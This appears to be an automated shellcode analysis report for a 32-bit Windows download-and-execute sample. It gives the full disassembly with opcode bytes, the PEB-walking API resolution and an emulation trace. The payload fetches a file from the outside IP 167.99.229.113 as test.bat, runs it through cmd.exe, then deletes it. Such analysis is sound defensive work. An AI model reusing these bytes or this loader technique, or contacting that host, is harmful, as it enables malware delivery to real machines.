Filename: gm_encoded-decoded_body_raw
File Type: rawHex
Architecture: 32-bit
Date Analyzed: 2022-04-13 09:54:09
classification: Very likely shellcode.
	Reason: Found shellcode APIs.
Seconds since last epoch: 1649861649.729062

Shellcode Entry point: 0x0
md5: 8d141c256325b0e7b8d8270b42b04058
sha256: 4136a45dbdd356c8fe2be261e3649de2c0a8e6b52596e629ba9c94c51ade139d
ssdeep: 12:KutlT1K4lHlhD6asH5QDMrt3J6srDmJ02sILcWobHEUJI:Xt3KglxxsZgMZ6+i02sILT


No push ret instructions found.

No fstenv instructions found.


***********
Call Pop
***********

********************************************************************************************************
Call pop Item: 0 | Section: -1 | Section name: rawHex
0x0        call 5 
0x5        pop  edx 

No syscall instructions found.


***************
Walking the PEB
***************

********************************************************************************************************
PEB Item: 0 | Points: 3 | Section: -1 | Section name: rawHex
0xc6       mov  edi, dword ptr fs:[0x30] 
0xcd       mov  edi, dword ptr [edi + 0xc] 
0xd0       mov  edi, dword ptr [edi + 0x14] 
0xd3       mov  esi, dword ptr [edi + 0x28] 
0xd6       xor  edx, edx 

No heaven's gate instructions found.


***********
Strings
***********

Note: The offset value is created by adding the offset plus the section virtual address.Strings from shellcode:

      PPPPPPVP                         Offset: 0x168    size: 8  Ascii     
      urlmon.dll                       Offset: 0x1d3    size: 10 Ascii     
      cmd.exe /c test.bat              Offset: 0x1de    size: 19 Ascii     
      http://167.99.229.113/default.css Offset: 0x1f2    size: 33 Ascii     
      test.bat                         Offset: 0x214    size: 8  Ascii     
      PPPPPPVP                         Offset: 0x168    size: 8  Ascii     
      urlmon.dll                       Offset: 0x1d3    size: 10 Ascii     
      cmd.exe /c test.bat              Offset: 0x1de    size: 19 Ascii     
      http://167.99.229.113/default.css Offset: 0x1f2    size: 33 Ascii     
      test.bat                         Offset: 0x214    size: 8  Ascii     





****************
Disassembly
****************


0x0 call 5                                   e800000000                      
	 label_0x5:
0x5 pop edx                                  5a                              
0x6 lea edx, [edx - 5]                       8d52fb                          
0x9 push edx                                 52                              
0xa mov ebx, 0x4b1ffe8e                      bb8efe1f4b                      
0xf call 0xc3                                e8af000000                      
0x14 pop edx                                  5a                              
0x15 push ebp                                 55                              
0x16 push edx                                 52                              
0x17 mov ebp, eax                             89c5                            
0x19 lea esi, [edx + 0x193]                   8db293010000                    
0x1f lea edi, [edx + 0x1af]                   8dbaaf010000                    
0x25 call 0xf9                                e8cf000000                      
0x2a pop edx                                  5a                              
0x2b pop ebp                                  5d                              
0x2c push ebp                                 55                              
0x2d push edx                                 52                              
0x2e lea eax, [edx + 0x1d3]                   8d82d3010000                    
0x34 push eax                                 50                              
0x35 call dword ptr [edx + 0x1bb]             ff92bb010000                    
0x3b pop edx                                  5a                              
0x3c pop ebp                                  5d                              
0x3d push ebp                                 55                              
0x3e push edx                                 52                              
0x3f mov ebp, eax                             89c5                            
0x41 lea esi, [edx + 0x1c7]                   8db2c7010000                    
0x47 lea edi, [edx + 0x1cf]                   8dbacf010000                    
0x4d call 0xf9                                e8a7000000                      
0x52 pop edx                                  5a                              
0x53 pop ebp                                  5d                              
0x54 push ebp                                 55                              
0x55 push edx                                 52                              
0x56 xor eax, eax                             31c0                            
0x58 lea esi, [edx + 0x1f2]                   8db2f2010000                    
0x5e lea edi, [edx + 0x214]                   8dba14020000                    
0x64 push eax                                 50                              
0x65 push eax                                 50                              
0x66 push edi                                 57                              
0x67 push esi                                 56                              
0x68 push eax                                 50                              
0x69 push dword ptr [edx + 0x1cf]             ffb2cf010000                    
0x6f pop eax                                  58                              
0x70 call eax                                 ffd0                            
0x72 pop edx                                  5a                              
0x73 pop ebp                                  5d                              
0x74 xor ecx, ecx                             31c9                            
0x76 cmp ecx, eax                             39c1                            
0x78 jne 0xb2                                 7538                            

0x7a push ebp                                 55                              
0x7b push edx                                 52                              
0x7c call 0x17a                               e8f9000000                      
0x81 pop edx                                  5a                              
0x82 pop ebp                                  5d                              
0x83 push ebp                                 55                              
0x84 push edx                                 52                              
0x85 call 0x15e                               e8d4000000                      
0x8a pop edx                                  5a                              
0x8b pop ebp                                  5d                              
0x8c push ebp                                 55                              
0x8d push edx                                 52                              
0x8e push 0x3000                              6800300000                      
0x93 push dword ptr [edx + 0x1bf]             ffb2bf010000                    
0x99 pop eax                                  58                              
0x9a call eax                                 ffd0                            
0x9c pop edx                                  5a                              
0x9d pop ebp                                  5d                              
0x9e push ebp                                 55                              
0x9f push edx                                 52                              
0xa0 lea edi, [edx + 0x214]                   8dba14020000                    
0xa6 push edi                                 57                              
0xa7 push dword ptr [edx + 0x1b3]             ffb2b3010000                    
0xad pop eax                                  58                              
0xae call eax                                 ffd0                            
0xb0 pop edx                                  5a                              
0xb1 pop ebp                                  5d                              
	 label_0xb2:
0xb2 push ebp                                 55                              
0xb3 push edx                                 52                              
0xb4 xor eax, eax                             31c0                            
0xb6 inc eax                                  40                              
0xb7 push eax                                 50                              
0xb8 push dword ptr [edx + 0x1b7]             ffb2b7010000                    
0xbe pop eax                                  58                              
0xbf call eax                                 ffd0                            
0xc1 pop edx                                  5a                              
0xc2 pop ebp                                  5d                              
	 label_0xc3:
0xc3 cld                                      fc                              
0xc4 xor edi, edi                             31ff                            
0xc6 mov edi, dword ptr fs:[0x30]             648b3d30000000                  
0xcd mov edi, dword ptr [edi + 0xc]           8b7f0c                          
0xd0 mov edi, dword ptr [edi + 0x14]          8b7f14                          
	 label_0xd3:
0xd3 mov esi, dword ptr [edi + 0x28]          8b7728                          
0xd6 xor edx, edx                             31d2                            
	 label_0xd8:
0xd8 lodsw ax, word ptr [esi]                 66ad                            
0xda test al, al                              84c0                            
0xdc je 0xef                                  7411                            

0xde cmp al, 0x41                             3c41                            
0xe0 jb 0xe8                                  7206                            

0xe2 cmp al, 0x5a                             3c5a                            
0xe4 ja 0xe8                                  7702                            

0xe6 or al, 0x20                              0c20                            
	 label_0xe8:
0xe8 rol edx, 7                               c1c207                          
0xeb xor dl, al                               30c2                            
0xed jmp 0xd8                                 ebe9                            

	 label_0xef:
0xef cmp edx, ebx                             39da                            
0xf1 mov eax, dword ptr [edi + 0x10]          8b4710                          
0xf4 mov edi, dword ptr [edi]                 8b3f                            
0xf6 jne 0xd3                                 75db                            

0xf8 ret                                      c3                              

	 label_0xf9:
0xf9 mov edx, ebp                             89ea                            
0xfb add edx, dword ptr [edx + 0x3c]          03523c                          
0xfe mov edx, dword ptr [edx + 0x78]          8b5278                          
0x101 add edx, ebp                             01ea                            
0x103 mov ebx, dword ptr [edx + 0x20]          8b5a20                          
0x106 add ebx, ebp                             01eb                            
0x108 xor ecx, ecx                             31c9                            
	 label_0x10a:
0x10a push edi                                 57                              
0x10b push esi                                 56                              
0x10c mov esi, dword ptr [esi]                 8b36                            
	 label_0x10e:
0x10e mov edi, dword ptr [ebx]                 8b3b                            
0x110 add edi, ebp                             01ef                            
0x112 push edx                                 52                              
0x113 xor edx, edx                             31d2                            
	 label_0x115:
0x115 rol edx, 7                               c1c207                          
0x118 xor dl, byte ptr [edi]                   3217                            
0x11a inc edi                                  47                              
0x11b cmp byte ptr [edi], 0                    803f00                          
0x11e jne 0x115                                75f5                            

0x120 xchg eax, edx                            92                              
0x121 pop edx                                  5a                              
0x122 cmp eax, esi                             39f0                            
0x124 je 0x132                                 740c                            

0x126 add ebx, 4                               83c304                          
0x129 inc ecx                                  41                              
0x12a cmp dword ptr [edx + 0x18], ecx          394a18                          
0x12d jne 0x10e                                75df                            

0x12f pop esi                                  5e                              
0x130 pop edi                                  5f                              
0x131 ret                                      c3                              

	 label_0x132:
0x132 pop esi                                  5e                              
0x133 pop edi                                  5f                              
0x134 lodsd eax, dword ptr [esi]               ad                              
0x135 push esi                                 56                              
0x136 push ebx                                 53                              
0x137 mov ebx, ebp                             89eb                            
0x139 mov esi, ebx                             89de                            
0x13b add ebx, dword ptr [edx + 0x24]          035a24                          
0x13e lea eax, [ebx + ecx*2]                   8d044b                          
0x141 movzx eax, word ptr [eax]                0fb700                          
0x144 lea eax, [esi + eax*4]                   8d0486                          
0x147 add eax, dword ptr [edx + 0x1c]          03421c                          
0x14a mov eax, dword ptr [eax]                 8b00                            
0x14c add eax, esi                             01f0                            
0x14e stosd dword ptr es:[edi], eax            ab                              
0x14f pop ebx                                  5b                              
0x150 pop esi                                  5e                              
0x151 add ebx, 4                               83c304                          
0x154 inc ecx                                  41                              
0x155 cmp dword ptr [esi], 0xffff              813effff0000                    
0x15b jne 0x10a                                75ad                            

0x15d ret                                      c3                              

	 label_0x15e:
0x15e lea esi, [edx + 0x1de]                   8db2de010000                    
0x164 push eax                                 50                              
0x165 push eax                                 50                              
0x166 xor eax, eax                             31c0                            
0x168 push eax                                 50                              
0x169 push eax                                 50                              
0x16a push eax                                 50                              
0x16b push eax                                 50                              
0x16c push eax                                 50                              
0x16d push eax                                 50                              
0x16e push esi                                 56                              
0x16f push eax                                 50                              
0x170 push dword ptr [edx + 0x1af]             ffb2af010000                    
0x176 pop eax                                  58                              
0x177 call eax                                 ffd0                            
0x179 ret                                      c3                              

	 label_0x17a:
0x17a xor eax, eax                             31c0                            
0x17c push 0x40                                6a40                            
0x17e push 0x1000                              6800100000                      
0x183 push 0x200                               6800020000                      
0x188 push eax                                 50                              
0x189 push dword ptr [edx + 0x1c3]             ffb2c3010000                    
0x18f pop eax                                  58                              
0x190 call eax                                 ffd0                            
0x192 ret                                      c3                              

0x193 db 0xc7                                  c7                              
0x194 mov dh, byte ptr [ecx]                   8a31                            
0x196 inc esi                                  46                              
0x197 fcomip st(0)                             dff0                            
0x199 lock sbb dword ptr [ecx], 0x2695902b     f081192b909526                  
0x1a0 sub byte ptr [eax + ecx*8 + 0x3d9972f5], 0xfe 80acc8f572993dfe                
0x1a8 push 0x7a                                6a7a                            
0x1aa db 0x69                                  69                              
0x1ab db 0xff                                  ff                              
0x1ac inc dword ptr [eax]                      ff00                            
0x1ae db 0x00                                  00                              
0x1af CreateProcessA - API pointer		  aa352614                        
0x1b3 DeleteFileA - API pointer		  64792614                        
0x1b7 ExitProcess - API pointer		  309f2614                        
0x1bb LoadLibraryA - API pointer		  f76e2614                        
0x1bf Sleep - API pointer		  37362614                        
0x1c3 VirtualAlloc - API pointer		  8e3d2614                        
0x1c7 db 0x99                                  99                              
0x1c8 db 0x23                                  23                              
0x1c9 db 0x5d                                  5d                              
0x1ca db 0xd9                                  d9                              
0x1cb db 0xff                                  ff                              
0x1cc db 0xff                                  ff                              
0x1cd db 0x00                                  00                              
0x1ce db 0x00                                  00                              
0x1cf URLDownloadToFileA - API pointer		  a42c2a16                        
0x1d3 urlmon.dll ; string		         75726c6d6f6e2e64...    urlmon.dll
0x1dd db 0x00                                  00                              
0x1de cmd.exe /c test.bat ; string		  636d642e65786520...    cmd.exe /c test.bat
0x1f1 db 0x00                                  00                              
0x1f2 http://167.99.229.113/default.css ; string		  687474703a2f2f31...    http://167.99.229.113/default.css
0x213 db 0x00                                  00                              
0x214 test.bat ; string		           746573742e626174                
0x21c db 0x00                                  00                              

**************************
     Emulation
**************************


************* APIs *************

0x12000035 LoadLibraryA(LPCTSTR lpLibFileName)
	LPCTSTR lpLibFileName: urlmon.dll
	Return: HINSTANCE 0x16212288

0x12000070 URLDownloadToFileA(LPUNKNOWN pCaller, LPCSTR szURL, LPCSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB)
	LPUNKNOWN pCaller: 0x0
	LPCSTR szURL: http://167.99.229.113/default.css
	LPCSTR szFileName: test.bat
	DWORD dwReserved: 0x0
	LPBINDSTATUSCALLBACK lpfnCB: 0x0
	Return: INT S_OK

0x12000190 VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
	LPVOID lpAddress: 0x0
	SIZE_T dwSize: 0x1000
	DWORD flAllocationType: MEM_COMMIT
	DWORD flProtect: PAGE_EXECUTE_READWRITE
	Return: INT 0x25000000

0x12000177 ProcessCreateA(LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
	LPCTSTR lpApplicationName: 
	LPTSTR lpCommandLine: cmd.exe /c test.bat
	LPSECURITY_ATTRIBUTES lpProcessAttributes: 0x0
	LPSECURITY_ATTRIBUTES lpThreadAttributes: 0x0
	BOOL bInheritHandles: 0x0
	DWORD dwCreationFlags: 0x0
	LPVOID lpEnvironment: 0x0
	LPCTSTR lpCurrentDirectory: 
	LPSTARTUPINFO lpStartupInfo: 0x25000000
	LPPROCESS_INFORMATION lpProcessInformation: 0x25000000
	Return: INT 0x20

0x1200009a Sleep(DWORD dwMilliseconds)
	DWORD dwMilliseconds: 0x3000
	Return: INT 0x20

0x120000ae DeleteFileA(LPCSTR lpFileName)
	LPCSTR lpFileName: test.bat
	Return: INT 0x20

0x120000bf ExitProcess(UINT uExitCode)
	UINT uExitCode: 1
	Return:  None


************* DLLs *************
DLLs                   
kernel32
urlmon

************* Artifacts *************
Artifacts              
urlmon.dll
167.99.229.113/default.css
http
test.bat
cmd.exe

Web artifacts          
http

